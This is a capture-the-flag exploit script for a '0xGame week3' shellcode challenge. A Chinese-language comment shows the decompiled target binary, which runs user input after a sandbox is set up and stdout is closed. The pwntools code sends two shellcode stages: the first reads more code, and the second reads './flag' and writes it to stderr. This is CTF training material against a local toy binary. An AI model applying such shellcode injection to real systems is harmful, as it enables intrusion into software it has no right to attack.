"""0xGame week3_shellcode, but FOP
⽤getdents64系统调⽤获取当前⽬录下⽂件，然后遍历dirent64结构体即可。

code:
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char *buf; // [rsp+8h] [rbp-8h]
  void (*bufa)(void); // [rsp+8h] [rbp-8h]

  bufinit(argc, argv, envp);
  buf = (char *)mmap((void *)0x20230000, 0x1000uLL, 7, 34, -1, 0LL);
  puts("Now show me your code:");
  read(0, buf, 0x100uLL);
  v3 = time(0LL);
  srand(v3);
  bufa = (void (*)(void))&buf[rand() % 0x100];
  puts("Implementing security mechanism...");
  sandbox();
  close(1);
  puts("Done!");
  bufa();
  return 0;
}

sc1 可以直接利用 rdx为
sc1 = '''
    xor rdi,rdi
    xor dl,dl
    push rdx
    pop rsi
    syscall # first read()
    '''
"""
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
s = process("./ret2shellcode-revenge")
# gdb.attach(s, 'b*$rebase(0x01555)\nc')
sc1 = asm(shellcraft.read(0, 0x20230000, 0x800))
s.sendafter(b"code:\n", sc1.rjust(0x100, b"\x90"))
sc2 = shellcraft.cat('./flag')  # type:str
sc2 = sc2.replace('push 1', 'push 2')  # write to stderr
s.send(b".\x00".ljust(0x100, b"\x90") + asm(sc2))
s.interactive()
